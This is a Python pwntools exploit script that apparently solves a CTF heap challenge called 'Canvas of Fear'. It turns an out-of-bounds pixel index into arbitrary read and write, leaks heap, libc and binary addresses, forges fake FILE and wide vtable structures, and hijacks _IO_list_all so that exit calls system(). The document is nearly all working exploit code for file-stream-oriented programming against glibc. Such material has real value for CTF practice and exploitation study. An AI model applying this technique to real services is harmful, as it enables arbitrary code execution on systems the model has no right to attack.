#!/usr/bin/env python3
"""Canvas of Fear - FSOP via _IO_list_all fake FILE"""
from pwn import *
import re, struct

context.log_level = 'info'
context.arch = 'amd64'

CHALL = '/home/student/ctfs/midnight_exe/pwn/canvas_of_fear/Canvas_of_fear'
libc = ELF(f'{CHALL}/libc.so.6', checksec=False)
ld   = ELF(f'{CHALL}/ld-linux-x86-64.so.2', checksec=False)

UNSORTED_BIN_FD = 0x1edc60 + 0x60
SYSTEM          = libc.symbols['system']
IO_LIST_ALL     = libc.symbols['_IO_list_all']
WFILE_JUMPS     = libc.symbols['_IO_wfile_jumps']
R_DEBUG         = ld.symbols['_r_debug']
LD_LIBC_OFF     = 0x206000
PIX2_OFF        = 0x1720

def mk_proc():
    return process([f'{CHALL}/ld-linux-x86-64.so.2','--library-path',CHALL,f'{CHALL}/canvas_manager'])
def create(p,cid,w,h):
    p.sendline(f'CREATE {cid} {w} {h}'.encode()); return p.recvline()
def delete(p,cid):
    p.sendline(f'DELETE {cid}'.encode()); return p.recvline()
def setpx(p,cid,idx,color):
    p.sendline(f'SET {cid} {idx&0xFFFFFFFF} 0 0x{color:06x}'.encode()); return p.recvline()
def get_pixels(p,cid):
    p.sendline(f'GET {cid}'.encode()); p.recvline()
    return [int(x,16) for x in re.findall(r'0x([0-9A-Fa-f]+)',p.recvline().decode())]
def pix2bytes(pl):
    return b''.join(bytes([(x>>16)&0xFF,(x>>8)&0xFF,x&0xFF]) for x in pl)
def set_height(p,h):
    hb=p32(h)
    setpx(p,2,-30,(0x00<<16)|(0x00<<8)|hb[0])
    setpx(p,2,-29,(hb[1]<<16)|(hb[2]<<8)|hb[3])
def set_pixels_ptr(p,addr):
    r=p64(addr)
    setpx(p,2,-27,(0x00<<16)|(r[0]<<8)|r[1])
    setpx(p,2,-26,(r[2]<<16)|(r[3]<<8)|r[4])
    setpx(p,2,-25,(r[5]<<16)|(r[6]<<8)|r[7])
def arb_read(p,addr,npix=3):
    set_height(p,npix); set_pixels_ptr(p,addr)
    return pix2bytes(get_pixels(p,1))
def write_qword(p, addr, val):
    set_height(p,3); set_pixels_ptr(p,addr)
    r=p64(val)
    setpx(p,1,0,(r[0]<<16)|(r[1]<<8)|r[2])
    setpx(p,1,1,(r[3]<<16)|(r[4]<<8)|r[5])
    setpx(p,1,2,(r[6]<<16)|(r[7]<<8)|0x00)

def exploit():
    p = mk_proc(); p.recvline()
    create(p,1,1,1); create(p,2,1,1)

    # Heap leak
    set_height(p,0x20)
    heap = u64(pix2bytes(get_pixels(p,1))[0x30:0x38]) - PIX2_OFF
    log.success(f"heap = {hex(heap)}")

    # Libc leak
    create(p,3,19,19); create(p,4,1,1); delete(p,3)
    libc_base = u64(arb_read(p,heap+0x1760,3)[0:8]) - UNSORTED_BIN_FD
    log.success(f"libc = {hex(libc_base)}")
    system_addr = libc_base + SYSTEM
    io_list_all = libc_base + IO_LIST_ALL
    wfile_jumps = libc_base + WFILE_JUMPS

    # Binary base
    ld_base = libc_base + LD_LIBC_OFF
    r_map = u64(arb_read(p,ld_base+R_DEBUG,6)[8:16])
    bin_base = u64(arb_read(p,r_map,4)[0:8])
    log.success(f"bin  = {hex(bin_base)}")

    # Old _IO_list_all head
    old_head = u64(arb_read(p, io_list_all, 3)[0:8])
    log.info(f"old _IO_list_all = {hex(old_head)}")

    # Canvas 5 for fake FILE
    create(p,5,50,50)
    cnt = u32(arb_read(p,bin_base+0x4040,3)[0:4])
    s5 = u64(arb_read(p,bin_base+0x4060+(cnt-1)*8,3)[0:8])
    pix5 = u64(arb_read(p,s5+0x10,3)[0:8])
    log.success(f"pix5 = {hex(pix5)}")

    # Layout: pix5+0x000=fake FILE, pix5+0x100=fake wide_data, pix5+0x200=fake wide vtable
    fake_file = pix5
    fake_wd   = pix5 + 0x100
    fake_wvt  = pix5 + 0x200

    # Build fake FILE (0x100 bytes)
    f = bytearray(0x100)
    cmd = b'    /app/read_flag\x00'  # leading spaces: clears _IO_NO_WRITES bit
    f[0:len(cmd)] = cmd                          # _flags area = command string
    struct.pack_into('<Q', f, 0x28, 1)            # _IO_write_ptr = 1 (> write_base=0)
    struct.pack_into('<Q', f, 0x68, old_head)     # _chain → old list head
    struct.pack_into('<Q', f, 0x88, fake_file+0xf0)  # _lock → zeros
    struct.pack_into('<Q', f, 0xa0, fake_wd)      # _wide_data
    struct.pack_into('<i', f, 0xc0, 1)            # _mode = 1 (wide)
    struct.pack_into('<Q', f, 0xd8, wfile_jumps)  # vtable = _IO_wfile_jumps

    # Build fake wide_data (0x100 bytes)
    w = bytearray(0x100)
    struct.pack_into('<Q', w, 0x20, 1)            # _IO_write_ptr = 1 (trigger flush)
    struct.pack_into('<Q', w, 0xe0, fake_wvt)     # _wide_vtable

    # Build fake wide vtable (0x80 bytes)
    v = bytearray(0x80)
    struct.pack_into('<Q', v, 0x68, system_addr)  # __doallocate = system

    # Write to canvas 5 pixels
    payload = bytes(f) + bytes(w) + bytes(v)
    log.info(f"Writing {len(payload)} bytes of fake structs...")
    for i in range(0, len(payload), 3):
        chunk = payload[i:i+3]
        if len(chunk)<3: chunk += b'\x00'*(3-len(chunk))
        if any(c != 0 for c in chunk):
            setpx(p,5,i//3,(chunk[0]<<16)|(chunk[1]<<8)|chunk[2])
    log.success("Fake FILE ready on heap")

    # Overwrite _IO_list_all → fake_file
    write_qword(p, io_list_all, fake_file)
    log.success("_IO_list_all overwritten!")

    # Trigger: EXIT → _IO_flush_all → FSOP → system("/app/read_flag")
    log.info("Triggering EXIT...")
    p.sendline(b'EXIT')
    try:
        out = p.recvrepeat(5)
        for line in out.decode(errors='replace').split('\n'):
            if line.strip(): log.success(f"  {line}")
    except: pass
    p.close()

exploit()
